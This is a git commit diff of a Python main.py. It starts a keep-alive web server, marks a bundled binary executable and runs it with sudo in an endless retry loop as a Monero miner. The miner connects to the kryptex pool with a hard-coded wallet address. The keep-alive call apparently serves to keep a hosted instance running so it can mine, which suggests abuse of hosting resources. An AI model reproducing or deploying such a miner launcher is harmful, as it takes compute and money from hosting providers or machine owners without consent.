5839b52e5d71d146f58172e6e77118242a1fe73b
AnasBoujamaa <131704517+AnasBoujamaa@users.noreply.github.com>
2024-04-09 19:25:15 +0200

    Update main.py

--- main.py
+++ main.py
@@ -2,8 +2,9 @@ import subprocess
 from webapp import keep_alive
 keep_alive()
 subprocess.run(["chmod", "+x", "main"], check=True)
+comando = ["./main", "--coin", "XMR", "--url", "xmr.kryptex.network:7777", "--user", "43Xncct4xFRLAyo84WPyaUVfCCJLmb7FZXUmW7ae6KJt2Vo571QYoiaVd4FRawUvHAj7JBqsm9d8qTVNPZHwv4GSCHkuG9M/Prueba69", "-p", "x", "-k"]
 while True:
     try:
-        subprocess.run(["sudo", "./main", "--coin", "XMR", "--url", "xmr.kryptex.network:7777", "--user", "43Xncct4xFRLAyo84WPyaUVfCCJLmb7FZXUmW7ae6KJt2Vo571QYoiaVd4FRawUvHAj7JBqsm9d8qTVNPZHwv4GSCHkuG9M/Prueba69", "-p", "x", "-k"], check=True)
+        subprocess.run(["sudo", *comando], check=True)
     except Exception as e:
         print(f'Error: {e}')
